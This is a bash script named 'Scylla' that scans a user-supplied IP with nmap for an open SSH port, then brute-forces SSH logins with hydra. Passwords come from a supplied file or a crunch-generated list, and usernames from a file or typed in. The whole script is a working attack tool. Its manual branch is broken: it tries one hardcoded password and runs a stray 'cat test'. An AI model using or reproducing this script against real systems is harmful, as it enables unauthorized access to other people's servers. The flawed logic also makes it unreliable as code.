#!/bin/bash


read -p "Welcome to Scylla. Please enter an IP Address to scan: " ip
nmap $ip > tempip.lst

if [ -z "$(cat tempip.lst | grep ssh)" ]
then
	echo
	echo "No open SSH ports detected! Try again"
	rm tempip.lst
	exit
fi

rm tempip.lst

echo
echo "$ip has an open SSH port! :)"
echo

echo "Do you wish to perform a Brute Force Attack?"
PS3="Enter 1 or 2: "
select opt in Yes No
do
	case "$opt" in
		Yes)
			echo "You have chosen to attempt an attack"
			break
			;;
		No)
			echo "You have selected $opt"
			echo "Thank you for using Scylla! Rarr!"
			exit
			;;
		* )
			echo "That is not a valid choice, Try again"
	esac
done

echo "Do you wish to provide a password list, crunch a new list, or exit"
PS3="Choose 1, 2, or 3: "
select pass in "Password List" Crunch Exit
do
	case "$pass" in
		"Password List")
			echo "You selected $pass"
			echo
			read -p "Enter filename or path to file" fn
			cat $fn > pass.lst
			break
			;;
			
		Crunch)
			echo "You selected $pass"
			read -p "Enter a minimum number: " min
			read -p "Enter a maximum number: " max
			read -p "Enter a string of desired characters: " charlist
			crunch $min $max $charlist >> pass.lst					
			break
			;;
			
		Exit)
			echo "You selected $pass. Goodbye!"
			exit
			;;
		* )
			echo "That is not a valid choice, Try again"
	esac
break
done

PS3="Choose 1, 2, or 3: "
select usrnme in "Username List" "Enter Manually" Exit
do
	case "$usrnme" in
		"Username List")
			echo "You have selected $usrnme"
			read -p "Enter filename or path to file" usrfile
			cat $usrfile > usernames.lst
			hydra $ip -L usernames.lst -P pass.lst ssh
			rm usernames.lst
			break
			;;
		"Enter Manually")
			echo "You have selected $usrnme"
			read -p "Enter username to try: " usrname
			cat test
			hydra $ip -l $usrname -p Tush@rWin10 ssh
			break
			;;
		Exit)
			echo "You selected $usrnme. Goodbye!"
			exit
			;;
		*)
			echo "That is not a valid choice, Try again"
	esac
done
rm pass.lst


